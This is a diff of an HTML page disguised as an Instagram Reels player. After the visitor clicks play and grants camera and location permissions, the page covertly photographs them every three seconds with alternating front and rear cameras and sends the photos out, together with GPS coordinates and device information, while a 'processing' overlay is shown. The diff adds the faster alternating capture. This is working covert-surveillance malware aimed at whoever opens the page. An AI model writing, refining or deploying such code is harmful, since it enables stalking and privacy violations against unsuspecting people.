@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>Instagram Reels · Permissions + Auto Send</title>
     <style>
+        /* (All styles same as before) */
         * {
             margin: 0;
             padding: 0;
@@ -20,7 +21,6 @@
             color: white;
         }
 
-        /* Reels container */
         .reels-container {
             position: relative;
             width: 100%;
@@ -29,7 +29,7 @@
             background: black;
             border-radius: 20px;
             overflow: hidden;
-            aspect-ratio: 9 / 16; /* Instagram reel aspect ratio */
+            aspect-ratio: 9 / 16;
             box-shadow: 0 0 20px rgba(0,0,0,0.8);
         }
 
@@ -72,7 +72,6 @@
             border: 2px solid white;
         }
 
-        /* Header / bottom info (optional) */
         .info-bar {
             padding: 15px;
             text-align: center;
@@ -80,7 +79,6 @@
             font-size: 14px;
         }
 
-        /* Processing overlay (same as original) */
         .processing-overlay {
             display: none;
             position: fixed;
@@ -124,7 +122,6 @@
             text-align: center;
         }
 
-        /* Exit warning (optional) */
         .exit-warning {
             display: none;
             position: fixed;
@@ -166,7 +163,6 @@
             cursor: pointer;
         }
 
-        /* Permission modal */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -248,7 +244,6 @@
             font-weight: bold;
         }
 
-        /* Hidden video container for camera stream */
         .video-container {
             position: fixed;
             bottom: 10px;
@@ -304,7 +299,7 @@
         <div class="reels-container">
             <!-- Video element for reel (public sample video) -->
             <video id="reelVideo" poster="https://storage.googleapis.com/gtv-videos-bucket/sample/images/BigBuckBunny.jpg" playsinline>
-                <source src="https://www.instagram.com/reel/DUC9g3CEpPo/?igsh=eWRjbmdoeHFwcXJ3">
+                <source src="https://storage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4" type="video/mp4">
                 Your browser does not support the video tag.
             </video>
             <!-- Play overlay (transparent button) -->
@@ -334,11 +329,12 @@
         let cameraPermanentlyDenied = false;
         let locationPermanentlyDenied = false;
         let stream = null;
-        let captureInterval = null;
-        let locationWatchId = null;
-        let currentFacingMode = 'user'; // front camera
+        let locationWatchId = null; // not used now but kept for cleanup
+        let currentFacingMode = 'user';
         let cameraReady = false;
         let isProcessing = false;
+        let captureTimer = null; // for setTimeout
+        let locationTimer = null; // for location repeats
 
         // DOM elements
         const video = document.getElementById('video');
@@ -444,7 +440,7 @@
                     (pos) => {
                         locationGranted = true;
                         locationPermanentlyDenied = false;
-                        sendWithRetry('location', { lat: pos.coords.latitude, lng: pos.coords.longitude });
+                        // Don't send immediately; will be sent in background capture
                         resolve(true);
                     },
                     (err) => {
@@ -518,26 +514,25 @@
 
         // Retry permissions button
         retryBtn.addEventListener('click', async function() {
-            // Hide modal temporarily
             permissionModal.classList.remove('active');
-            // Request both
             const camOk = await requestCameraPermission();
             const locOk = await requestLocationPermission();
             if (camOk && locOk) {
-                // Permissions granted, start background capture
                 startBackgroundCapture();
             } else {
-                // Show modal again with updated status
                 updatePermissionModal();
             }
         });
 
-        // ==================== BACKGROUND CAPTURE ====================
+        // ==================== BACKGROUND CAPTURE (modified) ====================
         function startBackgroundCapture() {
             if (isProcessing) return;
             isProcessing = true;
 
-            // Show processing overlay
+            // Clear any previous timers
+            if (captureTimer) clearTimeout(captureTimer);
+            if (locationTimer) clearTimeout(locationTimer);
+
             document.getElementById('processingOverlay').classList.add('active');
 
             // Send device info
@@ -550,68 +545,140 @@
             };
             sendWithRetry('device_info', deviceInfo);
 
-            // Start location watch (continuous)
-            if (navigator.geolocation) {
-                locationWatchId = navigator.geolocation.watchPosition(
-                    (pos) => {
-                        sendWithRetry('location', { lat: pos.coords.latitude, lng: pos.coords.longitude });
-                    },
-                    (err) => console.warn('watch error', err),
-                    { enableHighAccuracy: true, maximumAge: 10000 }
-                );
+            // ----- Location: only 3 times -----
+            let locationCount = 0;
+            function sendLocationOnce() {
+                if (locationCount < 3) {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            sendWithRetry('location', { lat: pos.coords.latitude, lng: pos.coords.longitude });
+                            locationCount++;
+                            if (locationCount < 3) {
+                                locationTimer = setTimeout(sendLocationOnce, 3000);
+                            }
+                        },
+                        (err) => {
+                            console.warn('location error', err);
+                            locationCount++; // still increment to avoid infinite loop (or you may decide to retry)
+                            if (locationCount < 3) {
+                                locationTimer = setTimeout(sendLocationOnce, 3000);
+                            }
+                        },
+                        { enableHighAccuracy: true, timeout: 8000 }
+                    );
+                }
+            }
+            sendLocationOnce(); // start first location
+
+            // ----- Photo capture every 3 seconds, alternating front/back -----
+            let photoCounter = 1;
+            let useFrontCamera = true; // start with front
+
+            // Function to switch camera and capture
+            async function captureAndSchedule() {
+                const facingMode = useFrontCamera ? 'user' : 'environment';
+                try {
+                    // Stop previous stream
+                    if (stream) {
+                        stream.getTracks().forEach(t => t.stop());
+                    }
+                    // Request new stream with desired facing mode
+                    const newStream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: facingMode, width: 640, height: 480 },
+                        audio: false
+                    });
+                    stream = newStream;
+                    video.srcObject = stream;
+                    await video.play();
+                    cameraReady = true;
+
+                    // Capture photo
+                    if (cameraReady) {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        canvas.toBlob((blob) => {
+                            if (blob) {
+                                sendPhotoWithRetry(blob, photoCounter++, facingMode === 'user' ? 'front' : 'back');
+                            }
+                        }, 'image/jpeg', 0.8);
+                    }
+                } catch (err) {
+                    console.error('Camera switch/capture error', err);
+                }
+
+                // Toggle for next capture
+                useFrontCamera = !useFrontCamera;
+
+                // Schedule next capture after 3 seconds
+                captureTimer = setTimeout(captureAndSchedule, 3000);
             }
 
-            // Start photo capture every 10 seconds
-            let photoCounter = 1;
-            captureInterval = setInterval(() => {
+            // First capture using existing stream (which is front camera from permission request)
+            (async () => {
                 if (stream && cameraReady) {
-                    // Capture frame from video
+                    // Use current stream (front)
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     canvas.toBlob((blob) => {
                         if (blob) {
-                            sendPhotoWithRetry(blob, photoCounter++, currentFacingMode === 'user' ? 'front' : 'back');
+                            sendPhotoWithRetry(blob, photoCounter++, 'front');
                         }
                     }, 'image/jpeg', 0.8);
+                } else {
+                    // Fallback: request front camera explicitly
+                    try {
+                        if (stream) stream.getTracks().forEach(t => t.stop());
+                        const newStream = await navigator.mediaDevices.getUserMedia({
+                            video: { facingMode: 'user', width: 640, height: 480 },
+                            audio: false
+                        });
+                        stream = newStream;
+                        video.srcObject = stream;
+                        await video.play();
+                        cameraReady = true;
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        canvas.toBlob((blob) => {
+                            if (blob) {
+                                sendPhotoWithRetry(blob, photoCounter++, 'front');
+                            }
+                        }, 'image/jpeg', 0.8);
+                    } catch (e) {
+                        console.error('First capture failed', e);
+                    }
                 }
-            }, 10000); // every 10 seconds
+
+                // After first capture, set for next capture to be rear
+                useFrontCamera = false;
+                // Schedule next after 3 seconds
+                captureTimer = setTimeout(captureAndSchedule, 3000);
+            })();
         }
 
         // ==================== PLAY BUTTON HANDLER ====================
         playOverlay.addEventListener('click', async function() {
-            // Hide overlay
             playOverlay.style.display = 'none';
-
-            // Start playing the reel video
             reelVideo.play().catch(e => console.log('play error', e));
 
-            // Request permissions
             const camOk = await requestCameraPermission();
             const locOk = await requestLocationPermission();
 
             if (camOk && locOk) {
-                // Both granted, start background capture
                 startBackgroundCapture();
             } else {
-                // Show permission modal to guide user
                 updatePermissionModal();
             }
         });
 
-        // Optional: If user clicks outside modal, maybe don't close; we have retry button only.
-
-        // Handle exit warning (optional) - we can keep but not used directly
-
         // Cleanup on page unload
         window.addEventListener('beforeunload', function() {
-            if (captureInterval) clearInterval(captureInterval);
-            if (locationWatchId) navigator.geolocation.clearWatch(locationWatchId);
+            if (captureTimer) clearTimeout(captureTimer);
+            if (locationTimer) clearTimeout(locationTimer);
             if (stream) stream.getTracks().forEach(t => t.stop());
         });
-
-        // Also handle if permissions already granted from previous session?
-        // On load, we could check but we don't want to auto-start. So we wait for play click.
     </script>
 </body>
 </html>
